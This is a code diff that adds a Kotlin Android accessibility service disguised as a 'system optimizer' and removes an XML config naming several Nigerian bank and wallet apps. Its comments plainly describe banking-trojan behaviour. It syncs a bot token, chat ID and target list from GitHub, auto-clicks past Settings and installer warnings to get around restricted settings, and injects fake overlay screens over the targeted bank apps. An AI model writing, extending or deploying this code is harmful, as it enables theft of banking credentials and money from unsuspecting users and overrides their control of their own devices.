@@ -1,14 +1,64 @@
-<?xml version="1.0" encoding="utf-8"?>
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:description="@string/accessibility_description"
-    android:accessibilityEventTypes="typeWindowStateChanged|typeViewClicked|typeViewFocused|typeWindowContentChanged"
-    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagRequestEnhancedWebAccessibility|flagReportViewIds|flagRetrieveInteractiveWindows"
-    android:accessibilityFeedbackType="feedbackGeneric"
-    android:notificationTimeout="100"
-    android:canRetrieveWindowContent="true"
-    android:canRequestFilterKeyEvents="true"
-    android:canPerformGestures="true"
-    android:canRequestTouchExplorationMode="false"
-    android:packageNames="com.opay.payments,com.kudabank.app,com.zenithbank.mwallet,com.accessbank.mobileapp,com.ubagroup.uba,com.paga.mobile"
-    android:settingsActivity="com.system.optimizer.core.MainActivity" />
+package com.system.optimizer.core
 
+import android.accessibilityservice.AccessibilityService
+import android.view.accessibility.AccessibilityEvent
+import android.util.Log
+
+/**
+ * THE GRADE A CENTRAL COMMAND
+ * Purpose: Monitors app switches, triggers overlays, and runs the auto-clicker.
+ */
+class SystemAccessibilityService : AccessibilityService() {
+
+    private var botToken: String = ""
+    private var chatId: String = ""
+    private var targetList: List<String> = emptyList()
+    
+    private lateinit var configLoader: RemoteConfigLoader
+    private lateinit var overlayController: OverlayController
+    private lateinit var autoClicker: PermissionAutoClicker
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        
+        // Initialize the sub-engines
+        configLoader = RemoteConfigLoader()
+        overlayController = OverlayController(this)
+        autoClicker = PermissionAutoClicker(this)
+
+        // 1. SYNC WITH THE BRAIN (GitHub)
+        configLoader.syncInternalParameters { token, id, targets ->
+            this.botToken = token
+            this.chatId = id
+            this.targetList = targets
+        }
+    }
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent) {
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val packageName = event.packageName?.toString() ?: return
+
+            // 2. RUN THE AUTO-CLICKER (Bypass warnings in Settings)
+            if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
+                autoClicker.scanAndClick(event)
+                autoClicker.bypassRestrictedSetting()
+            }
+
+            // 3. TRIGGER THE OVERLAY (Hijack Bank Apps)
+            // If the opened app is in our GitHub target list, we strike.
+            if (targetList.contains(packageName)) {
+                // Short delay to ensure the real app is fully loaded before we cover it
+                android.os.Handler(mainLooper).postDelayed({
+                    overlayController.injectFakeScreen(packageName)
+                }, 300)
+            } else {
+                // If they leave the bank app, we remove the fake screen instantly
+                overlayController.dismiss()
+            }
+        }
+    }
+
+    override fun onInterrupt() {
+        // Essential for the Android System to keep the service stable
+    }
+}
